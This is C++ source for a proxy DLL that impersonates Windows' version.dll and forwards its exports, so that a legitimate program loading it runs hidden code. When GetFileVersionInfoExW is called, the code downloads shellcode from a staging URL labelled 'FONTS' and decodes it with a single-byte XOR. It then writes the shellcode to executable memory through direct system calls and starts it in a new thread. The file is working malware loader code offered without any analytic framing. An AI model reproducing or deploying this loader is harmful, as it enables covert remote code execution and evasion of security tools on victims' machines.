#include <iostream>
#include <Windows.h>
#include "syscalls.h"
#include <WinInet.h>
#pragma comment(lib, "wininet.lib")

#pragma once

#define FONTS	L"https://url-to-payload-staging/shellcode.bin"


#pragma comment(linker,"/export:GetFileVersionInfoByHandle=c:\\windows\\system32\\version.GetFileVersionInfoByHandle,@2")

#pragma comment(linker,"/export:VerInstallFileW=c:\\windows\\system32\\version.VerInstallFileW,@13")
#pragma comment(linker,"/export:VerLanguageNameA=c:\\windows\\system32\\version.VerLanguageNameA,@14")
#pragma comment(linker,"/export:VerLanguageNameW=c:\\windows\\system32\\version.VerLanguageNameW,@15")


typedef BOOL(*GetFileVersionInfoA_Type)(LPCSTR lptstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData);
typedef BOOL(*GetFileVersionInfoExA_Type)(DWORD dwFlags, LPCSTR lpwstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData);
typedef BOOL(*GetFileVersionInfoExW_Type)(DWORD dwFlags, LPCWSTR lpwstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData);
typedef DWORD(*GetFileVersionInfoSizeA_Type)(LPCSTR lptstrFilename, LPDWORD lpdwHandle);
typedef DWORD(*GetFileVersionInfoSizeExA_Type)(DWORD dwFlags, LPCSTR lpwstrFilename, LPDWORD lpdwHandle);
typedef DWORD(*GetFileVersionInfoSizeExW_Type)(DWORD dwFlags, LPCWSTR lpwstrFilename, LPDWORD lpdwHandle);
typedef DWORD(*GetFileVersionInfoSizeW_Type)(LPCWSTR lptstrFilename, LPDWORD lpdwHandle);
typedef BOOL(*GetFileVersionInfoW_Type)(LPCWSTR lptstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData);
typedef DWORD(*VerFindFileA_Type)(DWORD uFlags, LPCSTR szFileName, LPCSTR szWinDir, LPCSTR szAppDir, LPSTR szCurDir, PUINT lpuCurDirLen, LPSTR szDestDir, PUINT lpuDestDirLen);
typedef DWORD(*VerFindFileW_Type)(DWORD uFlags, LPCWSTR szFileName, LPCWSTR szWinDir, LPCWSTR szAppDir, LPWSTR szCurDir, PUINT lpuCurDirLen, LPWSTR szDestDir, PUINT lpuDestDirLen);
typedef DWORD(*VerInstallFileA_Type)(DWORD uFlags, LPCSTR szSrcFileName, LPCSTR szDestFileName, LPCSTR szSrcDir, LPCSTR szDestDir, LPCSTR szCurDir, LPSTR szTmpFile, PUINT lpuTmpFileLen);
typedef BOOL(*VerQueryValueA_Type)(LPCVOID pBlock, LPCSTR lpSubBlock, LPVOID * lplpBuffer, PUINT puLen);
typedef BOOL(*VerQueryValueW_Type)(LPCVOID pBlock, LPCWSTR lpSubBlock, LPVOID * lplpBuffer, PUINT puLen);



HMODULE hModule = LoadLibrary(L"c:\\windows\\system32\\version.dll");

bool onlyOnce = false;

struct DLCode {
    byte* data;
    DWORD len;
};
//download function
BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

    BOOL		bSTATE = TRUE;

    HINTERNET	hInternet = NULL,
        hInternetFile = NULL;

    DWORD		dwBytesRead = NULL;

    SIZE_T		sSize = NULL; 	 			

    PBYTE		pBytes = NULL,					
        pTmpBytes = NULL;					

    
    hInternet = InternetOpenW(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60", NULL, NULL, NULL, NULL);
    if (hInternet == NULL) {
        bSTATE = FALSE; goto _EndOfFunction;
    }

    
    hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (hInternetFile == NULL) {
        bSTATE = FALSE; goto _EndOfFunction;
    }

    
    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) {
        bSTATE = FALSE; goto _EndOfFunction;
    }

    while (TRUE) {

        
        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
            bSTATE = FALSE; goto _EndOfFunction;
        }

        
        sSize += dwBytesRead;

        
        
        if (pBytes == NULL)
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        else
        
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

        if (pBytes == NULL) {
            bSTATE = FALSE; goto _EndOfFunction;
        }

        
        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

        
        memset(pTmpBytes, '\0', dwBytesRead);

        if (dwBytesRead < 1024) {
            break;
        }

    }


    *pPayloadBytes = pBytes;
    *sPayloadSize = sSize;

_EndOfFunction:
    if (hInternet)
        InternetCloseHandle(hInternet);											
    if (hInternetFile)
        InternetCloseHandle(hInternetFile);										
    if (hInternet)
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	
    if (pTmpBytes)
        LocalFree(pTmpBytes);													
    return bSTATE;
}

//dexoring function
void Detain(DLCode* code) {
    byte* data = code->data;
    DWORD len = code->len;

    for (DWORD i = 0; i < len; i++) {
        data[i] ^= 0xFA;
    }
}

INT Direct() {

    if (onlyOnce) return 1;
    onlyOnce = true;
        
    SIZE_T	Size = NULL;
    PBYTE	Bytes = NULL;


    // Reading the payload 
    if (!GetPayloadFromUrl(FONTS, &Bytes, &Size)) {
        return -1;
    }
    
    DLCode code = {code.data = Bytes, code.len = Size};
    Detain(&code);
    
  
    LPVOID allocation_start;
    SIZE_T allocation_size = code.len;
    HANDLE hThread;
    NTSTATUS status;

    allocation_start = nullptr;

    NtAllocateVirtualMemory(GetCurrentProcess(), &allocation_start, 0, (PULONG64)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    NtWriteVirtualMemory(GetCurrentProcess(), allocation_start, code.data, code.len, 0);

    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);

    NtClose(hThread);

    return 0;
}


BOOL GetFileVersionInfoA_Proxy(LPCSTR lptstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData)
{
    
	GetFileVersionInfoA_Type original = (GetFileVersionInfoA_Type)GetProcAddress(hModule, "GetFileVersionInfoA");
	return original(lptstrFilename, dwHandle, dwLen, lpData);
}
BOOL GetFileVersionInfoExA_Proxy(DWORD dwFlags, LPCSTR lpwstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData)
{
    
	GetFileVersionInfoExA_Type original = (GetFileVersionInfoExA_Type)GetProcAddress(hModule, "GetFileVersionInfoExA");
	return original(dwFlags, lpwstrFilename, dwHandle, dwLen, lpData);
}
BOOL GetFileVersionInfoExW_Proxy(DWORD dwFlags, LPCWSTR lpwstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData)
{
    Direct();
    
	GetFileVersionInfoExW_Type original = (GetFileVersionInfoExW_Type)GetProcAddress(hModule, "GetFileVersionInfoExW");
	return original(dwFlags, lpwstrFilename, dwHandle, dwLen, lpData);    
}
DWORD GetFileVersionInfoSizeA_Proxy(LPCSTR lptstrFilename, LPDWORD lpdwHandle)
{
    
	GetFileVersionInfoSizeA_Type original = (GetFileVersionInfoSizeA_Type)GetProcAddress(hModule, "GetFileVersionInfoSizeA");
	return original(lptstrFilename, lpdwHandle);
}
DWORD GetFileVersionInfoSizeExA_Proxy(DWORD dwFlags, LPCSTR lpwstrFilename, LPDWORD lpdwHandle)
{
    
	GetFileVersionInfoSizeExA_Type original = (GetFileVersionInfoSizeExA_Type)GetProcAddress(hModule, "GetFileVersionInfoSizeExA");
	return original(dwFlags, lpwstrFilename, lpdwHandle);
}
DWORD GetFileVersionInfoSizeExW_Proxy(DWORD dwFlags, LPCWSTR lpwstrFilename, LPDWORD lpdwHandle)
{
    
	GetFileVersionInfoSizeExW_Type original = (GetFileVersionInfoSizeExW_Type)GetProcAddress(hModule, "GetFileVersionInfoSizeExW");
	return original(dwFlags, lpwstrFilename, lpdwHandle);
}
DWORD GetFileVersionInfoSizeW_Proxy(LPCWSTR lptstrFilename, LPDWORD lpdwHandle)
{
    
	GetFileVersionInfoSizeW_Type original = (GetFileVersionInfoSizeW_Type)GetProcAddress(hModule, "GetFileVersionInfoSizeW");
	return original(lptstrFilename, lpdwHandle);
}
BOOL GetFileVersionInfoW_Proxy(LPCWSTR lptstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData)
{
    
	GetFileVersionInfoW_Type original = (GetFileVersionInfoW_Type)GetProcAddress(hModule, "GetFileVersionInfoW");
	return original(lptstrFilename, dwHandle, dwLen, lpData);
}
DWORD VerFindFileA_Proxy(DWORD uFlags, LPCSTR szFileName, LPCSTR szWinDir, LPCSTR szAppDir, LPSTR szCurDir, PUINT lpuCurDirLen, LPSTR szDestDir, PUINT lpuDestDirLen)
{
    
	VerFindFileA_Type original = (VerFindFileA_Type)GetProcAddress(hModule, "VerFindFileA");
	return original(uFlags, szFileName, szWinDir, szAppDir, szCurDir, lpuCurDirLen, szDestDir, lpuDestDirLen);
}
DWORD VerFindFileW_Proxy(DWORD uFlags, LPCWSTR szFileName, LPCWSTR szWinDir, LPCWSTR szAppDir, LPWSTR szCurDir, PUINT lpuCurDirLen, LPWSTR szDestDir, PUINT lpuDestDirLen)
{
    
	VerFindFileW_Type original = (VerFindFileW_Type)GetProcAddress(hModule, "VerFindFileW");
	return original(uFlags, szFileName, szWinDir, szAppDir, szCurDir, lpuCurDirLen, szDestDir, lpuDestDirLen);
}
DWORD VerInstallFileA_Proxy(DWORD uFlags, LPCSTR szSrcFileName, LPCSTR szDestFileName, LPCSTR szSrcDir, LPCSTR szDestDir, LPCSTR szCurDir, LPSTR szTmpFile, PUINT lpuTmpFileLen)
{
    
	VerInstallFileA_Type original = (VerInstallFileA_Type)GetProcAddress(hModule, "VerInstallFileA");
	return original(uFlags, szSrcFileName, szDestFileName, szSrcDir, szDestDir, szCurDir, szTmpFile, lpuTmpFileLen);
}
BOOL VerQueryValueA_Proxy(LPCVOID pBlock, LPCSTR lpSubBlock, LPVOID * lplpBuffer, PUINT puLen)
{
    
	VerQueryValueA_Type original = (VerQueryValueA_Type)GetProcAddress(hModule, "VerQueryValueA");
	return original(pBlock, lpSubBlock, lplpBuffer, puLen);
}
BOOL VerQueryValueW_Proxy(LPCVOID pBlock, LPCWSTR lpSubBlock, LPVOID * lplpBuffer, PUINT puLen)
{
    
	VerQueryValueW_Type original = (VerQueryValueW_Type)GetProcAddress(hModule, "VerQueryValueW");
	return original(pBlock, lpSubBlock, lplpBuffer, puLen);
}